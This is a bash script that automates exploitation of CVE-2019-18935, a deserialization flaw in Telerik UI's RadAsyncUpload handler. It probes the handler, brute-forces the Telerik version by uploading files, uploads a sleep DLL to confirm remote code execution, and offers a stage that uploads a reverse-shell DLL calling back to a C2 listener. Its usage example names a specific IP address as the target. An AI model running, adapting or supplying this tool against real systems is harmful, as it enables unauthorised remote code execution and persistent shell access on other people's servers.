#!/usr/bin/env bash
#
# CVE-2019-18935 — one-command end-to-end runner.
# Works on macOS and Linux (native); on Windows use Git Bash or WSL.
#
# Usage:
#   ./run.sh [STAGE]
#
#   STAGE  (default: auto)
#     check      - verify the RadAsyncUpload handler is registered (read-only)
#     versions   - find the vulnerable Telerik UI version (read-only file upload)
#     exploit    - upload sleep.dll + trigger deserialization, time the response
#     shell      - upload reverse-shell.dll + trigger (needs a C2 listener)
#     all        - check -> versions -> exploit  (stop before the reverse shell)
#     auto       - run 'all'
#
# Env vars (all overridable):
#   TARGET_URL   - full URL to the RAU handler, e.g.
#                  http://125.18.164.11:82/Telerik.Web.UI.WebResource.axd?type=rau
#   PAGE_URL     - page to scrape for version hints (default: TARGET_URL's /)
#   FOLDER       - remote temp folder for uploads (default: C:\Windows\Temp)
#   ARCH         - x86 | amd64 | both   (default: both)
#   REV_HOST     - C2 host the reverse shell connects to (shell stage)
#   REV_PORT     - C2 port (shell stage, default 4444)
#   VERSION      - pin a known Telerik version (skips auto-detect)
#   PYTHON       - python interpreter (default: python3)
#
# Example (from the Mac, through the VPN):
#   TARGET_URL="http://125.18.164.11:82/Telerik.Web.UI.WebResource.axd?type=rau" ./run.sh all
#   TARGET_URL="..." REV_HOST=10.2.0.2 REV_PORT=4444 ./run.sh shell

set -euo pipefail

# ---------------------------------------------------------------- paths
cd "$(dirname "$0")"
ROOT="$(pwd)"
PAYLOAD_DIR="$ROOT/payloads"
mkdir -p "$PAYLOAD_DIR"

TARGET_URL="${TARGET_URL:?Set TARGET_URL to the .../Telerik.Web.UI.WebResource.axd?type=rau endpoint}"
PAGE_URL="${PAGE_URL:-${TARGET_URL%%\?*}}"
FOLDER="${FOLDER:-C:\Windows\Temp}"
ARCH="${ARCH:-both}"
REV_HOST="${REV_HOST:-127.0.0.1}"
REV_PORT="${REV_PORT:-4444}"
VERSION="${VERSION:-}"
PYTHON="${PYTHON:-python3}"
STAGE="${1:-auto}"
case "$STAGE" in auto) STAGE=all ;; esac

log()  { printf '\n\033[1;34m[+]\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
die()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }

# ---------------------------------------------------------------- deps
need_py() {
  command -v "$PYTHON" >/dev/null 2>&1 || die "python3 not found (set PYTHON=...)"
  "$PYTHON" - <<'PY' >/dev/null 2>&1 || return 1
import requests, Crypto
PY
}
if ! need_py; then
  log "Installing Python deps (requests, pycryptodome) into a venv at .venv"
  "$PYTHON" -m venv .venv 2>/dev/null || { "$PYTHON" -m pip install --user virtualenv -q && "$PYTHON" -m virtualenv .venv; }
  VENV_PY=".venv/bin/python"
  "$VENV_PY" -m pip install --quiet --upgrade pip
  "$VENV_PY" -m pip install --quiet pycryptodome requests
  PYTHON="$VENV_PY"
fi
log "Python ready: $PYTHON ($($PYTHON -c 'import requests,Crypto;print(requests.__version__,Crypto.__version__)' 2>/dev/null))"

# ---------------------------------------------------------------- payloads
have_payload() { # $1 arch
  ls "$PAYLOAD_DIR"/*-"$1".dll >/dev/null 2>&1
}
ensure_payloads() {
  local arches=()
  case "$ARCH" in
    x86|amd64) arches=("$ARCH") ;;
    both) arches=(x86 amd64) ;;
  esac
  local missing=0 a
  for a in "${arches[@]}"; do have_payload "$a" || missing=1; done
  if [ "$missing" -eq 0 ]; then
    log "Payloads already present:"
    ls -1 "$PAYLOAD_DIR"/*-*.dll
    return 0
  fi

  if [ "$(uname -s)" = "Darwin" ] && command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
    log "Building payloads with mingw-w64 (Mac)..."
    for a in "${arches[@]}"; do
      local csrc=src/sleep.c extra=""
      if [ "$a" = "x86" ]; then extra="-m32"; fi
      # sleep payload
      local ts; ts=$(date +%Y%m%d%H%M%S)
      x86_64-w64-mingw32-gcc $extra -shared -o "$PAYLOAD_DIR/sleep-${ts}-${a}.dll" "$csrc" -static -lws2_32
      log "  built $(basename "$PAYLOAD_DIR/sleep-${ts}-${a}.dll")"
    done
  else
    warn "MSVC/mingw build not available on this host."
    warn "Pre-built payloads must be committed (they are, via CI) — using whatever exists."
    ls -1 "$PAYLOAD_DIR" || true
    [ -n "$(ls -A "$PAYLOAD_DIR" 2>/dev/null)" ] || die "No payloads found and no build toolchain. Run on Windows or install mingw-w64."
  fi
}
ensure_payloads

# ---------------------------------------------------------------- helpers
http_get() { # $1 url  -> prints body, returns status
  curl -skL --max-time 30 "$1"
}

stage_check() {
  log "CHECK: is the RadAsyncUpload handler registered?"
  local body
  body=$(http_get "$TARGET_URL") || warn "GET failed (network?) — continuing"
  case "$body" in
    *"RadAsyncUpload handler is registered"*)
      log "Handler registered. Body: $body"
      return 0 ;;
    *)
      warn "Unexpected response (first 300 chars):"
      printf '%s\n' "$body" | head -c 300; echo
      return 0 ;;   # don't hard-fail; version scan may still work
  esac
}

stage_versions() {
  log "VERSIONS: discover the Telerik UI version"
  if [ -n "$VERSION" ]; then
    log "  VERSION pinned to $VERSION — skipping discovery"
    return 0
  fi

  # (a) scrape the page for 20xx.y.z style version strings
  local page hints
  page=$(http_get "$PAGE_URL" || true)
  hints=$(printf '%s' "$page" | grep -oE '20[0-9]{2}(\.[0-9]+)+' | sort -u || true)
  if [ -n "$hints" ]; then
    log "  version-like strings found on page:"
    printf '    %s\n' $hints
  fi

  # (b) authoritative: brute-force upload a tiny file per known version with RAU_crypto
  local testfile; testfile=$(mktemp)
  echo "version-probe" > "$testfile"
  local versions=(
    2007.1423 2007.21010 2008.2723 2009.2701 2010.2713 2011.2712 2012.2.724
    2013.1.220 2013.2.611 2014.1.225 2015.1.204 2015.2.604 2016.1.113
    2016.2.504 2016.3.914 2017.1.118 2017.2.503 2017.3.913
  )
  log "  probing ${#versions[@]} known-vulnerable versions via RAU_crypto (read-only upload)..."
  local v ok=0
  for v in "${versions[@]}"; do
    local out
    out=$("$PYTHON" RAU_crypto/RAU_crypto.py -P "$FOLDER" "$v" "$testfile" "$TARGET_URL" 2>/dev/null || true)
    if printf '%s' "$out" | grep -q 'fileInfo'; then
      log "  ** version $v accepted the upload — this is the target's Telerik UI version"
      VERSION="$v"
      ok=1
      break
    fi
    printf '  - %s: no fileInfo\n' "$v"
  done
  rm -f "$testfile"
  if [ "$ok" -ne 1 ]; then
    warn "No version matched by upload. If the page scrape found candidates above, pin one with VERSION=x.y.z and rerun."
  else
    log "Detected VERSION=$VERSION"
    export VERSION
  fi
}

pick_payload() { # $1 base  -> echoes best payload path
  local base="$1" p=""
  if [ "$ARCH" = "x86" ] || [ -z "$ARCH" ]; then
    p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-x86.dll 2>/dev/null | head -1 || true)
  fi
  if [ -z "$p" ]; then p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-amd64.dll 2>/dev/null | head -1 || true); fi
  if [ -z "$p" ]; then p=$(ls -1t "$PAYLOAD_DIR"/${base}-*.dll 2>/dev/null | head -1 || true); fi
  printf '%s' "$p"
}

run_exploit() { # $1 payload  $2 version
  local payload="$1" ver="$2"
  log "EXPLOIT: uploading $(basename "$payload") and triggering deserialization"
  export REV_HOST REV_PORT
  "$PYTHON" CVE-2019-18935.py \
    -u "$TARGET_URL" \
    -v "$ver" \
    -f "$FOLDER" \
    -p "$payload"
  local rt
  rt=$(tail -n 5 "$ROOT/.last_rt" 2>/dev/null || true)
  log "Done. A ~10s response time for the sleep payload = confirmed RCE."
}

stage_exploit() {
  [ -n "$VERSION" ] || die "Need a version (run 'versions' first or set VERSION=)."
  local payload; payload=$(pick_payload sleep)
  [ -n "$payload" ] || die "No sleep payload found in $PAYLOAD_DIR"
  run_exploit "$payload" "$VERSION"
}

stage_shell() {
  [ -n "$VERSION" ] || die "Need a version (run 'versions' first or set VERSION=)."
  local payload; payload=$(pick_payload revshell)
  [ -n "$payload" ] || die "No revshell payload found in $PAYLOAD_DIR"
  log "SHELL: C2 at $REV_HOST:$REV_PORT — start your listener now (e.g. nc -lvp $REV_PORT)"
  run_exploit "$payload" "$VERSION"
}

# ---------------------------------------------------------------- dispatch
case "$STAGE" in
  check)    stage_check ;;
  versions) stage_check; stage_versions ;;
  exploit)  stage_check; stage_versions; stage_exploit ;;
  shell)    stage_check; stage_versions; stage_shell ;;
  all)      stage_check; stage_versions; stage_exploit ;;
  *) die "unknown stage: $STAGE (use: check|versions|exploit|shell|all)" ;;
esac
